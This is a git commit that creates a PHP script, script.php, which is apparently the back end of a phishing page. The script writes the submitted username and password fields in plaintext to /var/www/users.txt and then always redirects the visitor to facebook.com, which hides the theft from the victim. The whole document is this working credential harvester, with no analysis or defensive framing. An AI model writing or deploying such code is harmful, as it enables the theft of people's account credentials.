1b50691c3ada22845f31107226fc89734a1212b2
Cameron Poe <cameron@zay.li>
2016-05-14 13:35:39 -0500

    Create script.php

---
+++ script.php
@@ -0,0 +1,14 @@
+<?php
+if(isset($_POST['field1']) && isset($_POST['field2'])) {
+    $data = 'username: ' . $_POST['field1'] . ' password: ' . $_POST['field2'] . "\n";
+    $ret = file_put_contents('/var/www/users.txt', $data, FILE_APPEND | LOCK_EX);
+    if($ret === false) {
+        header( 'Location: https://www.facebook.com/' );
+    }
+    else {
+        header( 'Location: https://www.facebook.com/' );
+    }
+}
+else {
+   header( 'Location: https://www.facebook.com/' );
+}
